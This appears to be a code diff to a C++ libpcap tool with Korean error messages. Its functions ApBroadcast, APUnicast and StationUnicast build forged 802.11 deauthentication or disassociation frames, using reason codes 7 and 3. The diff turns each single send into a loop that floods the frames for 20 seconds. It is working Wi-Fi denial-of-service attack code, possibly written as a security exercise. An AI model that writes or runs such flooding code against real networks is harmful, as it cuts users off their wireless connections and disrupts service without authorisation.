@@ -34,10 +34,15 @@ void ApBroadcast(pcap_t* handle, char* apMac){
     }
 
     packet.fixed.ReasonCode = 0x0007;
-
-    if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
-        fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
-    }
+    auto start = std::chrono::steady_clock::now();
+    auto end = start;
+    do {
+        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
+            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
+        }
+        fprintf(stderr,"send\n");
+        end = std::chrono::steady_clock::now();
+    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
 }
 
 void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
@@ -84,9 +89,15 @@ void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
 
     packet.fixed.ReasonCode = 0x0007;
 
-    if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
-        fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
-    }
+    auto start = std::chrono::steady_clock::now();
+    auto end = start;
+    do {
+        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
+            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
+        }
+        fprintf(stderr,"send\n");
+        end = std::chrono::steady_clock::now();
+    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
 }
 
 void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
@@ -134,9 +145,15 @@ void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
 
     packet.fixed.ReasonCode = 0x0003;
 
-    if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
-        fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
-    }
+    auto start = std::chrono::steady_clock::now();
+    auto end = start;
+    do {
+        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
+            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
+        }
+        fprintf(stderr,"send\n");
+        end = std::chrono::steady_clock::now();
+    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
 }
 
 void authentication(pcap_t* handle, char* apMac, char* stationMac){
